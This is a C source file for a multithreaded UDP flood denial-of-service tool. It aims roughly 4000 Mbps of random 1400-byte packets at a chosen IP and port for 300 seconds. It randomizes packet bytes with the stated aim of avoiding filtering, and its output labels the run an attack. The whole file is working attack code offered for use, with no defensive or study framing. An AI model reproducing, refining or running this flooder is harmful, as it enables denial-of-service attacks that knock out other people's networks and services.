#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>

#define MAX_THREADS 100
#define PACKET_SIZE 1400  // Optimal for Ethernet MTU
#define ATTACK_DURATION 300
#define TARGET_MBPS 4000  // 4000 Mbps target

// Calculate packets per second needed for 4000 Mbps
// 4000 Mbps = 4000 * 1,000,000 bits/sec = 4,000,000,000 bits/sec
// Packet size: 1400 bytes = 1400 * 8 = 11,200 bits
// Packets/sec needed: 4,000,000,000 / 11,200 ≈ 357,143 pps
#define TARGET_PPS 357143

typedef struct {
    int sock;
    struct sockaddr_in target_addr;
    int thread_id;
    volatile int *running;
    long packets_sent;
} thread_data_t;

void* flood_thread(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    char packet[PACKET_SIZE];
    
    // Pre-fill packet with random data
    for (int i = 0; i < PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }

    long packets_sent = 0;
    struct timespec ts, start_ts, current_ts;
    long target_ns_per_packet = 1000000000L / TARGET_PPS;  // ns per packet
    long packets_per_batch = TARGET_PPS / MAX_THREADS;
    
    clock_gettime(CLOCK_MONOTONIC, &start_ts);
    
    while (*(data->running)) {
        // Send batch of packets
        for (int i = 0; i < packets_per_batch; i++) {
            // Randomize packet slightly to avoid filtering
            packet[0] = rand() % 256;
            packet[1] = rand() % 256;
            
            sendto(data->sock, packet, PACKET_SIZE, 0, 
                  (struct sockaddr*)&data->target_addr, sizeof(data->target_addr));
            packets_sent++;
        }
        
        // Rate limiting to achieve target PPS
        clock_gettime(CLOCK_MONOTONIC, &current_ts);
        long elapsed_ns = (current_ts.tv_sec - start_ts.tv_sec) * 1000000000L + 
                         (current_ts.tv_nsec - start_ts.tv_nsec);
        
        long expected_packets = elapsed_ns / target_ns_per_packet;
        if (packets_sent > expected_packets) {
            usleep(1000);  // Small delay if we're sending too fast
        }
    }
    
    data->packets_sent = packets_sent;
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <TARGET_IP> <TARGET_PORT> <THREAD_COUNT>\n", argv[0]);
        printf("Recommended thread count: 16-32 for optimal performance\n");
        exit(1);
    }

    char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int thread_count = atoi(argv[3]);
    
    if (thread_count > MAX_THREADS) {
        printf("Thread count too high. Maximum: %d\n", MAX_THREADS);
        exit(1);
    }

    printf("Starting UDP Flood Attack:\n");
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Threads: %d\n", thread_count);
    printf("Target Rate: %d Mbps (~%d packets/sec)\n", TARGET_MBPS, TARGET_PPS);
    printf("Packet Size: %d bytes\n", PACKET_SIZE);
    printf("Duration: %d seconds\n\n", ATTACK_DURATION);

    // Initialize random seed
    srand(time(NULL));

    // Create raw socket for maximum performance
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == -1) {
        perror("Socket creation failed");
        exit(1);
    }

    // Set socket options for maximum performance
    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    // Increase send buffer size
    int sendbuf_size = 1024 * 1024;  // 1MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf_size, sizeof(sendbuf_size));

    // Setup target address
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sock);
        exit(1);
    }

    // Thread management
    pthread_t threads[MAX_THREADS];
    thread_data_t thread_data[MAX_THREADS];
    volatile int running = 1;
    clock_t start_time = clock();

    // Create flood threads
    for (int i = 0; i < thread_count; i++) {
        thread_data[i].sock = sock;
        thread_data[i].target_addr = target_addr;
        thread_data[i].thread_id = i;
        thread_data[i].running = &running;
        thread_data[i].packets_sent = 0;
        
        if (pthread_create(&threads[i], NULL, flood_thread, &thread_data[i]) != 0) {
            perror("Thread creation failed");
            running = 0;
            break;
        }
    }

    printf("Attack running for %d seconds...\n", ATTACK_DURATION);
    
    // Run for specified duration
    while ((clock() - start_time) / CLOCKS_PER_SEC < ATTACK_DURATION) {
        sleep(1);
        
        // Calculate and display current throughput
        static long total_packets_prev = 0;
        long total_packets = 0;
        for (int i = 0; i < thread_count; i++) {
            total_packets += thread_data[i].packets_sent;
        }
        
        long packets_diff = total_packets - total_packets_prev;
        double mbps = (packets_diff * PACKET_SIZE * 8) / (1024.0 * 1024.0);
        printf("Current throughput: %.2f Mbps (%ld packets/sec)\n", mbps, packets_diff);
        
        total_packets_prev = total_packets;
    }

    // Stop threads
    running = 0;
    
    // Wait for threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    // Calculate total statistics
    long total_packets = 0;
    for (int i = 0; i < thread_count; i++) {
        total_packets += thread_data[i].packets_sent;
    }
    
    double total_mbps = (total_packets * PACKET_SIZE * 8) / 
                       (ATTACK_DURATION * 1024.0 * 1024.0);
    double avg_pps = total_packets / ATTACK_DURATION;

    printf("\nAttack completed!\n");
    printf("Total packets sent: %ld\n", total_packets);
    printf("Average throughput: %.2f Mbps\n", total_mbps);
    printf("Average packets/sec: %.2f\n", avg_pps);
    printf("Target achieved: %.1f%%\n", (total_mbps / TARGET_MBPS) * 100);

    close(sock);
    return 0;
}
